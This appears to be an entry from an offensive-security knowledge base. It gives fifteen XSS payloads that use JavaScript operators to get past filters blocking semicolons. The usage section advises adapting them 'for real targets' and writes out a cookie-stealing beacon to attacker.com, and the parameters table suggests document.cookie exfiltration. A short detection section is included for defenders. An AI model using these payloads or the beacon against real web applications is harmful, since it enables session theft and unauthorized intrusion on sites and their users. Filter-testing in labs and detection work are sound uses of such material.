---
id: bfe511e2-8552-4895-a474-3ad8195954f6
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.844797+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss
  - filter-bypass
  - payload
  - javascript
platforms:
  - Web
validated: true
---

# JavaScript-Operator-Bypass-Payloads

## Code

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

## Description

This JavaScript code snippet provides a series of exotic payloads designed to bypass filters that block semicolons (;) in XSS attacks. Each line uses a different JavaScript operator to separate expressions and execute an alert() function, demonstrating how to chain code without standard statement terminators. The 'te' and 'xt' strings are concatenated around the alert to form 'text' implicitly, while the operator triggers the popup. This is useful for testing and exploiting weak input sanitization in web applications.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert('message') | The function call to execute; replace with custom code like document.cookie for exfiltration | alert('xss') |
| 'te' and 'xt' | Placeholder strings for concatenation; optional and can be customized | 'te' and 'xt' |

## Usage

Inject this code into a vulnerable input field (e.g., search box, form) within an XSS context, such as `<script>` tags or event attributes like `onerror`. Submit and trigger reflection to execute. Ideal for red team exercises testing WAF rules or filter efficacy. Start with a local app like XSS Game or DVWA, then adapt for real targets by replacing alert() with payloads that beacon to an attacker server (e.g., new Image().src='http://attacker.com/?'+document.cookie).

## Detection

- Monitor for unusual JavaScript operator chains in input logs or reflected output.
- Browser CSP violations or WAF alerts on eval-like behaviors and alert() calls.
- Network logs showing unexpected beacons from client-side scripts to external domains.
- Client-side monitoring via script blockers or anomaly detection in DOM manipulations.

## Related

- [[procedures/Exotic-Payloads-for-Bypassing-Filters-in-JavaScript]]
